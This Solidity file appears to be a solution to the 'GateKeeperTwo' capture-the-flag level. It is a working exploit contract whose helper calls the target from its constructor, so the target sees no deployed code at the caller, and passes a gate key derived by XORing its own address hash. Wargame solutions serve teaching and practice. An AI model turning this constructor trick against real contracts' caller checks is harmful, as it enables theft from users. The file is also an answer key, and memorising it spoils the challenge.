// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/GateKeeperTwo/GateKeeperTwo.sol";

contract GateKeeperTwoExploit {
    GateKeeperTwo victim;

    constructor(address _victim) {
        victim = GateKeeperTwo(payable(_victim));
    }

    function hack() public {
        // Deploy the helper contract which will call enter during construction
        new GateKeeperTwoAttack(victim);
    }

    receive() external payable {}
}

contract GateKeeperTwoAttack {
    constructor(GateKeeperTwo victim) {
        // Compute the gateKey based on this contract's address
        bytes8 gateKey = bytes8(uint64(type(uint64).max) ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        // Call the enter function with the computed gateKey
        victim.enter{gas: 800000}(gateKey);
    }

    receive() external payable {}
}